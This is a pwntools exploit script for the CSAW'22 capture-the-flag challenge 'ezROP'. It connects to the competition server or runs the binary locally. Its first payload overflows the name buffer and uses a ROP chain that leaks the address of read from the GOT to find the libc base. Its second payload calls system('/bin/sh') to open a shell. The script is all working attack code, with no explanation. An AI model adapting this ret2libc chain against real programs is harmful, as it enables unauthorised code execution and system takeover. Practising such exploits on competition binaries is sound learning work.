#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./ezROP"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("pwn.chal.csaw.io", 5002)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        b *main+40
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


payload = b""
payload += b"A" * 0x67 + b'\x00'
payload += b"B" * 0x8 * 2
payload += p64(0x4015a3)# pop rdi; ret
payload += p64(elf.got['read'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['_start'])

p.recvuntil("what's your name?")
sleep(0.5)
p.send(payload)

p.recvuntil("Welcome to CSAW'22!\n")
leak = u64(p.recv(6) + b"\x00\x00")
log.info("read@libc: " + hex(leak))
libc_base = leak - libc.symbols['read']
log.info("libc: " + hex(libc_base))

payload = b""
payload += b"A" * 0x67 + b'\x00'
payload += b"B" * 0x8 * 2
payload += p64(0x4015a3)# pop rdi; ret
payload += p64(libc_base + 0x1b45bd)# /bin/sh addr
payload += p64(0x401533)# ret
payload += p64(libc_base + libc.symbols['system'])

p.recvuntil("what's your name?")
sleep(0.5)
p.send(payload)


p.interactive()
